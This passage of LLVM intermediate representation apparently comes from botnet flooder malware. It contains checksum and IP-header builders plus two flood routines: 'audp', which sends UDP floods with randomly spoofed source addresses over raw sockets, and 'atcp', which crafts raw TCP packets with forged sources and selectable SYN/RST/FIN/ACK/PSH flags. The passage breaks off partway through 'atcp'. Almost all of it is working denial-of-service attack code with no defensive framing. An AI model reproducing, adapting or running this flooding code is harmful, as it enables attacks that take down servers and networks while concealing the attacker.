  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #14
  %10 = tail call noalias i8* @malloc(i64 44) #7
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #7
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #9 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !5

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #14
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #14
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %50

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #7
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %26
  %30 = add nsw i32 %4, 1
  %31 = sext i32 %30 to i64
  %32 = tail call noalias i8* @malloc(i64 %31) #7
  %33 = icmp eq i8* %32, null
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %29
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %32, i8 0, i64 %31, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %32, i32 %4)
  %35 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %36 = add nsw i32 %35, %2
  %37 = sext i32 %4 to i64
  %38 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %34
  %.058 = phi i32 [ 0, %34 ], [ %.058.be, %.backedge.backedge ]
  %39 = call i64 @sendto(i32 %27, i8* nonnull %32, i64 %37, i32 0, %struct.sockaddr* nonnull %38, i32 16) #7
  %40 = icmp eq i32 %.058, %5
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %.backedge
  br i1 %10, label %42, label %45

; <label>:42:                                     ; preds = %41
  %43 = call i32 @rand_cmwc()
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %18, align 2
  br label %45

; <label>:45:                                     ; preds = %42, %41
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %47 = icmp sgt i32 %46, %36
  br i1 %47, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:48:                                     ; preds = %.backedge
  %49 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %48, %45
  %.058.be = phi i32 [ %49, %48 ], [ 0, %45 ]
  br label %.backedge

; <label>:50:                                     ; preds = %22
  %51 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %.loopexit, label %53

; <label>:53:                                     ; preds = %50
  store i32 1, i32* %8, align 4
  %54 = bitcast i32* %8 to i8*
  %55 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* nonnull %54, i32 4) #7
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %53
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %57, %.preheader ], [ 50, %.preheader.preheader ]
  %57 = add nsw i32 %.05962, -1
  %58 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %59 = call i32 @rand_cmwc()
  %60 = xor i32 %59, %58
  call void @srand(i32 %60) #7
  %61 = call i32 @rand() #7
  call void @init_rand(i32 %61)
  %62 = icmp eq i32 %57, 0
  br i1 %62, label %63, label %.preheader

; <label>:63:                                     ; preds = %.preheader
  %64 = icmp eq i32 %3, 0
  %65 = sub nsw i32 32, %3
  %66 = shl i32 -1, %65
  %.060 = select i1 %64, i32 0, i32 %66
  %67 = sext i32 %4 to i64
  %68 = add nsw i64 %67, 28
  %69 = call i8* @llvm.stacksave()
  %70 = alloca i8, i64 %68, align 16
  %71 = bitcast i8* %70 to %struct.iphdr*
  %72 = getelementptr i8, i8* %70, i64 20
  %73 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @getRandomIP(i32 %.060)
  %76 = call i32 @htonl(i32 %75) #14
  %77 = add nsw i64 %67, 8
  %78 = trunc i64 %77 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %71, i32 %74, i32 %76, i8 zeroext 17, i32 %78)
  %79 = trunc i64 %77 to i16
  %80 = call zeroext i16 @htons(i16 zeroext %79) #14
  %81 = getelementptr inbounds i8, i8* %70, i64 24
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 8
  %83 = call i32 @rand_cmwc()
  %84 = trunc i32 %83 to i16
  %85 = bitcast i8* %72 to i16*
  store i16 %84, i16* %85, align 4
  br i1 %10, label %86, label %88

; <label>:86:                                     ; preds = %63
  %87 = call i32 @rand_cmwc()
  br label %92

; <label>:88:                                     ; preds = %63
  %89 = trunc i32 %1 to i16
  %90 = call zeroext i16 @htons(i16 zeroext %89) #14
  %91 = zext i16 %90 to i32
  br label %92

; <label>:92:                                     ; preds = %88, %86
  %93 = phi i32 [ %87, %86 ], [ %91, %88 ]
  %94 = trunc i32 %93 to i16
  %95 = getelementptr inbounds i8, i8* %70, i64 22
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = getelementptr inbounds i8, i8* %70, i64 26
  %98 = bitcast i8* %97 to i16*
  store i16 0, i16* %98, align 2
  %99 = getelementptr inbounds i8, i8* %70, i64 28
  call void @makeRandomStr(i8* %99, i32 %4)
  %100 = bitcast i8* %70 to i16*
  %101 = getelementptr inbounds i8, i8* %70, i64 2
  %102 = bitcast i8* %101 to i16*
  %103 = load i16, i16* %102, align 2
  %104 = zext i16 %103 to i32
  %105 = call zeroext i16 @csum(i16* nonnull %100, i32 %104)
  %106 = getelementptr inbounds i8, i8* %70, i64 10
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %109 = add nsw i32 %108, %2
  %110 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %111 = getelementptr inbounds i8, i8* %70, i64 4
  %112 = bitcast i8* %111 to i16*
  %113 = getelementptr inbounds i8, i8* %70, i64 12
  %114 = bitcast i8* %113 to i32*
  %115 = trunc i32 %1 to i16
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %92
  %.0 = phi i32 [ 0, %92 ], [ %.0.be, %.backedge61.backedge ]
  %116 = call i64 @sendto(i32 %51, i8* nonnull %70, i64 %68, i32 0, %struct.sockaddr* nonnull %110, i32 16) #7
  %117 = call i32 @rand_cmwc()
  %118 = trunc i32 %117 to i16
  store i16 %118, i16* %85, align 4
  br i1 %10, label %119, label %121

; <label>:119:                                    ; preds = %.backedge61
  %120 = call i32 @rand_cmwc()
  br label %124

; <label>:121:                                    ; preds = %.backedge61
  %122 = call zeroext i16 @htons(i16 zeroext %115) #14
  %123 = zext i16 %122 to i32
  br label %124

; <label>:124:                                    ; preds = %121, %119
  %125 = phi i32 [ %120, %119 ], [ %123, %121 ]
  %126 = trunc i32 %125 to i16
  store i16 %126, i16* %96, align 2
  %127 = call i32 @rand_cmwc()
  %128 = trunc i32 %127 to i16
  store i16 %128, i16* %112, align 4
  %129 = call i32 @getRandomIP(i32 %.060)
  %130 = call i32 @htonl(i32 %129) #14
  store i32 %130, i32* %114, align 4
  %131 = load i16, i16* %102, align 2
  %132 = zext i16 %131 to i32
  %133 = call zeroext i16 @csum(i16* nonnull %100, i32 %132)
  store i16 %133, i16* %107, align 2
  %134 = icmp eq i32 %.0, %5
  br i1 %134, label %135, label %138

; <label>:135:                                    ; preds = %124
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %137 = icmp sgt i32 %136, %109
  br i1 %137, label %140, label %.backedge61.backedge

; <label>:138:                                    ; preds = %124
  %139 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %138, %135
  %.0.be = phi i32 [ %139, %138 ], [ 0, %135 ]
  br label %.backedge61

; <label>:140:                                    ; preds = %135
  call void @llvm.stackrestore(i8* %69)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %45
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %26, %50, %17, %53, %29, %140
  ret void
}

declare i32 @time(...) local_unnamed_addr #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #14
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %142

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %142, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #7
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %142, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %3, 0
  %34 = sub nsw i32 32, %3
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %5 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #14
  %47 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0)) #15
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %.preheader

.preheader:                                       ; preds = %32
  %63 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %64 = icmp eq i8* %63, null
  br i1 %64, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:65:                                     ; preds = %32
  %66 = and i16 %58, -8177
  %67 = or i16 %66, 8016
  store i16 %67, i16* %57, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge77
  %68 = phi i8* [ %83, %.backedge77 ], [ %63, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0)) #15
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0)) #15
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0)) #15
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %.backedge77

.backedge77:                                      ; preds = %80, %.sink.split
  %83 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %84 = icmp eq i8* %83, null
  br i1 %84, label %.loopexit.loopexit, label %.lr.ph

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %85 = load i16, i16* %57, align 16
  %86 = and i16 %85, %.sink7
  %87 = or i16 %86, %.sink5
  store i16 %87, i16* %57, align 16
  br label %.backedge77

.loopexit.loopexit:                               ; preds = %.backedge77
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %65
  %88 = call i32 @rand_cmwc()
  %89 = trunc i32 %88 to i16
  %90 = getelementptr inbounds i8, i8* %39, i64 34
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = getelementptr inbounds i8, i8* %39, i64 36
  %93 = bitcast i8* %92 to i16*
  store i16 0, i16* %93, align 4
  %94 = getelementptr inbounds i8, i8* %39, i64 38
  %95 = bitcast i8* %94 to i16*
  store i16 0, i16* %95, align 2
  br i1 %11, label %96, label %98

; <label>:96:                                     ; preds = %.loopexit
  %97 = call i32 @rand_cmwc()
  br label %102

; <label>:98:                                     ; preds = %.loopexit
  %99 = trunc i32 %1 to i16
  %100 = call zeroext i16 @htons(i16 zeroext %99) #14
  %101 = zext i16 %100 to i32
  br label %102

; <label>:102:                                    ; preds = %98, %96
  %103 = phi i32 [ %97, %96 ], [ %101, %98 ]
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds i8, i8* %39, i64 22
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %107, i16* %93, align 4
  %108 = bitcast i8* %39 to i16*
  %109 = getelementptr inbounds i8, i8* %39, i64 2
  %110 = bitcast i8* %109 to i16*
